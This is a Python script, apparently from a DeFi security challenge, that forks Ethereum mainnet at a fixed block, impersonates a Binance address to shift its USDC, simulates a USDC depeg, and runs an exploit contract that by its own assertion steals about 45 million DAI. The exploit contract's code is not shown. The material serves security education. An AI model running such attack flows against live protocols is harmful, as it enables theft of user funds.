from ape import accounts, project, Contract
from .utils.helper import w3, fork, get_block, impersonate, transfer_from

BINANCE_ADDRESS = "0x47ac0Fb4F2D84898e4D9E7b4DaB3C24507a6D503"
BLOCK = 14584692


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Necessary Contracts for Challenge ---\n")
    usdc = Contract("0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48")
    dai = Contract("0x6B175474E89094C44Da98b954EedeAC495271d0F")

    exploit = project.Exploit1.deploy(sender=attacker)
    print(f"\n--- Exploit contract deployed to: {exploit.address}---\n")

    depeg = project.Depeg.deploy(sender=attacker)
    print(f"\n--- Depeg contract deployed to: {depeg.address}---\n")

    print("\n--- Simulating a USDC depeg event... ---\n")
    binance_usdc_balance = usdc.balanceOf(BINANCE_ADDRESS)

    impersonate(BINANCE_ADDRESS)

    transfer_from(usdc.address, BINANCE_ADDRESS, depeg.address, binance_usdc_balance)

    depeg.messWithPeg(sender=attacker)

    print("\n--- Finished depegging USDC... ---\n")

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    exploit.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: We successfully stole ~45 Million Dai ---\n")

    assert dai.balanceOf(exploit.address) > w3.to_wei(44999999, "ether")

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
